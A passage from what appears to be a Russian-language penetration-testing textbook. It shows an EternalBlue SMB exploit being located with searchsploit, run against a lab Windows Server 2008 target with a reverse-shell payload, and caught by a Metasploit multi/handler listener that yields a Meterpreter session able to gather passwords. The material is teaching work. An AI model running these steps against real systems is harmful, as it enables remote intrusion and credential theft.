   Например, ниже вы можете увидеть результаты поиска. Мы получаем список из трех программ-эксплойтов, но никаких
   результатов шелл-кода. Это и не удивительно, поскольку шеллкода, специально связанного с Eternal Blue, не существует.
   Вместо этого отображается просто уязвимость в реализации протокола Server Message Block (SMB).

     $ searchsploit "eternal blue"
     --------------------------------------- --------------------------------------
      Exploit Title                         | Path
                                            | (/usr/share/exploitdb/)
     --------------------------------------- --------------------------------------
     Microsoft Windows Windows 7/2008 R2 (x | exploits/windows_x86-64/
     remote/42031.py
     Microsoft Windows Windows 7/8.1/2008 R | exploits/windows/remote/42315.py
     Microsoft Windows Windows 8/8.1/2012 R | exploits/windows_x86-64/
     remote/42030.py
     --------------------------------------- --------------------------------------
     Shellcodes: No Result

  Вы можете запустить этот эксплойт оттуда, где он находится, или скопировать его в свой домашний каталог и запустить. Это
   избавит вас от необходимости передавать путь к сценарию Python при его запуске. Также, это позволит вам вносить
   изменения, если вы хотите поэкспериментировать, оставляя при этом функциональный код эксплойта нетронутым. В
   следующем листинге кода вы увидите запуск скрипта 42031.py  , атакующий ту же систему, которую мы атаковали с
  помощью Metasploit . Последний параметр командной строки — это исполняемый код в файле с именем payload . Это
   комбинация двух отдельных фрагментов исполняемого кода. Первый — это шеллкод, написанный автором эксплойта Python.
   В конце этого находится программа-заглушка, которая отправляет соединение обратно в прослушивающую его систему.

     $ python 42031.py 192.168.86.24 payload
     shellcode size: 1262
     numGroomConn: 13
     Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
     SMB1 session setup allocate nonpaged pool success
     SMB1 session setup allocate nonpaged pool success
     good response status: INVALID_PARAMETER
     done

   Это только половина атаки. Здесь вы видите, что эксплойт успешно работает, запускает уязвимость и заставляет удаленную
   службу выполнить предоставленный шеллкод. Шеллкод здесь представляет собой исполняемый файл, созданный из кода
   языка ассемблера. Он включает в себя оболочку Meterpreter и способ обратного подключения к системе, для обратного
   вызова которой он был настроен. Для этого необходимо также настроить прослушиватель. Для этого мы снова
   возвращаемся в msfconsole . В следующем листинге вы можете увидеть загрузку модуля прослушивателя и настройку
   порта прослушивания и IP-адреса. Когда эксплойт запускается на цели, вы также увидите соединение с прослушивателем.

     msf> use exploit/multi/handler
     msf exploit(multi/handler)> set LHOST 192.168.86.57
     LHOST => 192.168.86.57
     msf exploit(multi/handler)> set LPORT 4444
     LPORT => 4444
     msf exploit(multi/handler)> exploit

   Это дает нам возможность взаимодействовать с удаленной системой с помощью Meterpreter  , языка оболочки, не
   зависящего от операционной системы. Он имеет ряд команд, которые можно запускать в целевой системе независимо от
    того, какая операционная система установлена в целевой системе. Meterpreter переводит передаваемые ему команды в
   команды, специфичные для базовой операционной системы. Это может включать в себя перечисление файлов, изменение
   каталогов, загрузку файлов и сбор системной информации, например паролей.
